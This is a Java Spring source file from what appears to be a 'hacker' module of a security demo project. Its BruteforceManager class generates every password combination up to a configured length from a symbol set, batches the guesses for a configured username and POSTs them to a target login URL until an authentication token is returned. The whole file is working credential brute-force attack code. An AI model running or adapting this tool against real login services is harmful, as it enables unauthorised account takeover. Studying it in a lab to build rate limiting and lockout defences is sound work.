package ch.lalumash.hacker.manager;

import ch.lalumash.core.LoginDto;
import ch.lalumash.core.LoginResponseDto;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.env.Environment;
import org.springframework.web.client.HttpStatusCodeException;
import org.springframework.web.client.RestTemplate;

import java.util.HashSet;

public class BruteforceManager {
    private final String url;
    private final String symbols;
    private final String max;
    private final String user;
    private final String dtosPerRequest;

    private HashSet<LoginDto> comb = new HashSet<>();
    private long totalCount = 0;

    @Autowired
    public BruteforceManager(Environment environment) {
        url = environment.getProperty("bruteforce.url");
        symbols = environment.getProperty("bruteforce.symbols");
        max = environment.getProperty("bruteforce.max");
        user = environment.getProperty("bruteforce.user");
        dtosPerRequest = environment.getProperty("bruteforce.requests-per");
    }

    public String bruteforce() {
        totalCount = 0;
        comb = new HashSet<>();

        String res = genAll(symbols.toCharArray(), Integer.parseInt(max));
        if (res != null) {
            return res;
        }
        if (comb.size() > 0) {
            return send();
        }
        return null;
    }

    String send() {
        String r = sendRequests();
        if (r != null) {
            return r + "; requests sent: " + totalCount;
        }
        comb.clear();
        return null;
    }

    private String sendRequests() {
        try {
            System.out.println("sending request with " + comb.size() + " login data.");
            LoginResponseDto lgu = new RestTemplate().postForObject(url, comb, LoginResponseDto.class);
            assert lgu != null;
            return lgu.getToken();
        } catch (HttpStatusCodeException ignored) {
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return null;
    }

    String genAll(char[] set, int k) {
        for (int i = 1; i <= k; i++) {
            String g = gen(set, i);
            if (g != null) {
                return g;
            }
        }
        return null;
    }

    String gen(char[] set, int k) {
        int n = set.length;
        return printAllKLengthRec(set, "", n, k);
    }

    String printAllKLengthRec(char[] set,
                              String prefix,
                              int n, int k) {
        if (k == 0) {
            comb.add(new LoginDto(this.user, prefix));
            totalCount++;
            if (comb.size() >= Integer.parseInt(dtosPerRequest)) {
                return send();
            }
            return null;
        }

        for (int i = 0; i < n; ++i) {
            String newPrefix = prefix + set[i];
            String res = printAllKLengthRec(set, newPrefix,
                    n, k - 1);
            if (res != null) {
                return res;
            }
        }
        return null;
    }
}
